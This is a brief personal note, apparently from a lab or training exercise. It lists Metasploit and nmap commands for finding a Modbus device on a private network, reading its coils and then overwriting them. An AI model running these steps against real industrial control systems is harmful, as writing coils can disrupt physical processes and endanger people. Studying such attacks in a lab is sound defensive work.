
![[Pasted image 20260227221257.png]]



````r
ifconfig eth0 192.168.46.66/24 nmap 192.168.46.0/24 -p 502

msfconsole use auxiliary/scanner/scada/modbus_findunitid 
set RHOSTS 192.168.46.100
run

use auxiliary/scanner/scada/modbusclient 
set RHOST ==192.168.46.100== 
set DATA_ADDRESS 0 
set action READ_COILS
set NUMBER 256 
run

set action WRITE_COILS 
set DATA_COILS 00010010 
run

```